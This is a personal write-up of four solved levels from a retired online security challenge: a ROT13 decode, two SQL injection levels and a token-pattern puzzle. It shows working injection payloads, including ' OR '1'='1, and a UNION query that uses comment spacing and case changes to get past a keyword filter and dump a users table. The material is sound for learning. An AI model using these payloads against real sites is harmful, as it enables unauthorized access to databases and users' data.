# Security Challenge Answers

Author: Chad Gosselin, https://github.com/cgio

This file contains answers to a popular security company's online security challenge.

The company does not want public write-ups posted. Therefore, I have redacted sensitive information. In addition, this is for a previous set of challenges that are no longer accessible.

For each challenge, I've have described my thought process.

## Challenge 1

**Challenge URL: [REDACTED]/debug**

The challenge is finding the meaning of the string 'uggc ubfg u4pxz3'. Contextually, this is the first challenge, so the puzzle should be fairly straightforward. Therefore, let's assume this is basic manipulation of the English language. The first possible word is 'uggc'. There are two repeating characters. Very few English letters can repeat consecutively, such as oo, ee, and tt. If we switch the 'g' to 'o', we are moving up in the alphabet 8 characters. We can apply this to the other instances of 'g' to see if English words emerge. No success. Well, we are dealing with an Internet security challenge that likely points to the next challenge. There are no other clues to where the challenge would be on this page. Therefore, it's possible that the first word is 'http'. It's the same length and matches the repeating characters. The distance between 'g' and 't' is 13 characters. If we gobeyond 'z', let's wrap from the beginning and count from there for the remaining distance. Sure enough, this seems to solve the puzzle. A URL emerges. It works / points to the next challenge, so swapping the '4' for 'a', etc. is unnecessary. We're done!

By the way, was this challenge inspired by Mr. Robot S02E11?

*Python demo example:*

```
import string

puzzle_encoded = 'uggc ubfg u4pxz3'
puzzle_decoded = ''

key_ascii_lowercase = string.ascii_lowercase
# key_leetspeak = {'3': 'e', '4': 'a'}  # Not needed

magic_number = 13

for c in puzzle_encoded:
    if ord('a') <= ord(c) <= ord('z'):
        c_pos = key_ascii_lowercase.index(c)
        if c_pos + magic_number > len(key_ascii_lowercase):
            c_pos = magic_number - (len(key_ascii_lowercase) - c_pos)
            puzzle_decoded += key_ascii_lowercase[c_pos]
        else:
            puzzle_decoded += key_ascii_lowercase[c_pos + magic_number]
    # elif c in key_leetspeak.keys():
    #     puzzle_decoded += key_leetspeak[c]
    else:
        puzzle_decoded += c
# prints 'http host [REDACTED]'
print(puzzle_decoded)
# Therefore, https://[REDACTED]/[REDACTED] is the next challenge.
```

## Challenge 2

**Challenge URL: [REDACTED]/c/00fde4a9234dbf2a6aef4e415683120a**

Here, a button on the page performs a GET request that returns a basic HTML page that looks similar to:

```
Pages:

    * goats
    * chicken
    * dogs
    * cows
```

Here is the URL that generates this page listing:
```
[REDACTED]/c/00fde4a9234dbf2a6aef4e415683120a?key=2780d36d4e0e17581ac5ddbb0036ef39
```

The page's source code, GET request, and response are not interesting, as viewed by Chrome's Developer Tools. When changing the key query string value, the page listing does not appear. Therefore, the key value determines the page contents. This is likely a SQL injection challenge because of the limited attack options for obtaining a result. Also, SQL injection is a good early test subject.

We can test for a vulnerability by adding a ' to the query string to see if there's an escape.

For example:
```
[REDACTED]/c/00fde4a9234dbf2a6aef4e415683120a?key='2780d36d4e0e17581ac5ddbb0036ef39
```

The result is:
```
An error occurred while performing operation [select name from pages where key=''2780d36d4e0e17581ac5ddbb0036ef39']
```

This shows the page is vulnerable to SQL injection. So now, it's a matter of figuring out what the designer of this challenge is trying to test.

Perhaps there's a hidden page that we need to find or something else in the database (if it's truly a database and not just a check for a specific type of injection).

One way to get a list of all the pages is to make the query equivalent to:
```
SELECT name FROM pages WHERE key = '' OR '1'='1';
```

In theory, this should work because the condition after OR is true and causes all of the pages to be listed.

Therefore, let's try:
```
[REDACTED]/c/00fde4a9234dbf2a6aef4e415683120a?key=2780d36d4e0e17581ac5ddbb0036ef39' OR '1'='1
```

That's interesting - there's a new page in listed in the response bullets:
```
Pages:

    * goats
    * chicken
    * dogs
    * cows
    * c12539240c6c66aafbd2e62d87cc2a5a
```

This last page is a hyperlink that goes to the next challenge!

## Challenge 3

**Challenge URL: [REDACTED]/c/c12539240c6c66aafbd2e62d87cc2a5a**

My initial impression is that this is another SQL injection challenge. The page text, 'The "users" table is protected by military grade security' is interesting. It's also possible this is a real SQL database, as the page asks not to employ automated tools (that may cause server performance issues).

To test for SQL vulnerabilities, submitting ' for the book title produces an error:
```
Error: The following error occurred: [unrecognized token: "'''"]

Query: SELECT * FROM books WHERE title='''
```
Let's try the previous challenge's answer.

Submitting the following in the input field...

```
' OR '1'='1
```

...produces a list of books in the database, not normally accessible:
```
1   Cryptonomicon         Neal Stephenson     Avon                         2002     978-0060512804
2   1984                  George Orwell       Secker and Warbur            1949     978-0-14-118776-1
3   Anathem               Neal Stephenson     HarperCollins Publishers     2009     978-0061474101
4   Neuromancer           William Gibson      Ace                          1984     0-441-56956-0
5   Superintelligence     Nick Bostrom        Oxford University Press      2014     978-0199678112
```

Interestingly, for every attempt to get the users table with ```SELECT```, ```'SELECT'``` is removed in the error. Using ```'Select'``` instead, or other case variations, is effective in bypassing the filter. Also, during these tests, spaces in the query string are removed.

Let's try to create our own query similar to the original query and what we know so far.

Original query:
```
SELECT * FROM books WHERE title=''
```

Modified query to invoke a result:
```
'/**/UNION/**/Select/**/*/**/FROM/**/books/**/WHERE/**/title='1984'--
```

We know that UNION combines multiple queries. In this case, a book with
the title '' and a book with the title 1984. The -- at the end comments
out any additional query commands.

This query products one result:
```
2   1984    George Orwell   Secker and Warburg  1949    978-0-14-118776-1
```

We have confirmed that we can successfully perform our own queries. Now, it's a matter of obtaining the contents of the user table using a similar query:

```
'/**/UNION/**/Select/**/*/**/FROM/**/users--
```

Sure enough, that is the solution:
```
1     bob      bob@mailinator.com      bobbobberson!                        1     1
2     jim      jim@gmail.com           jimisthebest123                      1     1
3     flag     you.got@me.com          efac33ad391b6077b176c7b8577588cd     1     1
4     jill     jill@mailtothis.com     jackandjill1                         1     1
```

Row three contains a link to the next challenge.

## Challenge 4

**Challenge URL: [REDACTED]/c/efac33ad391b6077b176c7b8577588cd**

No immediate signs of vulnerability in page source code. This does not seem to be another database challenge. The token quantity can be modified. The maximum token quantity per request is 100. Perhaps there is a pattern. The token length is 96 characters. Oddly, for every token, some of the characters are the same in their respective positions.

A few of the generated tokens:

```
a03c65315135a20576c39445100866875137f08d21b19d40919c63926e35456901392800c33b88818b47f80188b16704
a20c70374116a54593c26452136806800141f74d63b86d61932c81927e30433985305894c68b29826b95f28159b59734
a81c13338130a43572c68414136838846173f25d06b32d83918c71914e68404952331862c81b83898b18f38188b33772
a85c33333145a33562c46440137825816134f72d98b61d47928c43911e38411954360886c86b34856b09f48161b29797
```

Common characters with all others stripped (length is 32 characters):
```
ac31a5c41881fdbd9c9e4938cb8bf1b7
```

...Sure enough, that is the solution. I could have written a script for this, but it was quicker to do it by hand.

## Note

As mentioned previously, this is an older set of challenges that are no longer accessible. I intended to continue solving them, but had to work on other things.
